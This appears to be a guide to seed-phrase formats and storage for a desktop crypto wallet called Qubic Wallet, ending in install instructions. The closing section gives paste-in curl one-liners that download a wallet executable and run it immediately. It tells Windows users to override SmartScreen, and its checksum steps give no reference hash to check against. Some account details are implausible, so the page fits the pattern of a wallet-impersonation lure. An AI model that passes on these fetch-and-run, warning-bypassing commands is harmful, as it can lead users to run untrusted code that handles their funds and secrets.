The formats described are the ones generated by the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2) and its account model.

> Two formats, one job: a secret you can write down and type back exactly.

Qubic Wallet generates one of two seed formats depending on your password. A password starting with a capital `Q` produces the Qubic format: 55 characters drawn from the lowercase alphabet only. Any other password produces a 24-word BIP39 phrase. Both are valid accounts with the same capabilities, and the difference is real when you come to write one down and restore it later.

## The 55-character Qubic seed

Fifty-five characters, lowercase letters only. No digits, no spaces, no capital letters. That constraint is what makes the format easy to transcribe and easy to check: a character outside the alphabet is a transcription error, not a variation.

Write it in groups you can verify, and count the characters when you finish.

## The 24-word format

Twenty-four words from the BIP39 list, which is a vocabulary designed so that a single wrong word is detectable. Word order matters, and a swapped pair produces a different account rather than an error.

## Why the password chooses

The seed is derived from the password, which is why the first character decides the format and why a typo during creation produces a real account you did not intend. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-create-first-account.md">account creation walkthrough</a> follows that moment.

## Storing it

Paper, offline, in a place you would keep a title deed. Two copies in two locations is better than one perfect copy, and neither should sit beside the password.

Do not photograph it, do not type it into a website, and do not paste it anywhere - the app blocks clipboard copies of the seed for exactly that reason.

## The mistakes that cost accounts

Writing it from memory instead of from the screen. Trusting a screenshot in a synced folder. Storing the phrase and the password together. Restoring on a machine with an unverified build, which is what the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-restore-account-seed.md">restore guide</a> warns about.

All of it applies to the phrase generated by the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>; a stale build may describe a different list.

## FAQ

### How long is a Qubic seed?

55 characters for the Qubic format, or 24 words for the BIP39 format.

### Can a Qubic seed contain numbers?

No. The alphabet is lowercase letters only.

### Why did I get 24 words instead?

Your password did not begin with a capital `Q`, which selects the word format.

### Are both formats equally safe?

They are both seeds. Strength came from generation, which is what the October 2026 incident was about.

### Can I convert one format to the other?

Not by rewriting it. They are different derivations, so a conversion would be a different account.

### Does the phrase include my password?

No. The password is separate and is needed alongside the phrase.

### Can I store the phrase in a password manager?

Only if you accept that the manager is now the single point of failure. Paper in two places is more durable.

### What if I only have 54 characters?

Then you have a transcription error, not a valid seed. Recheck against the original screen or record.

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.
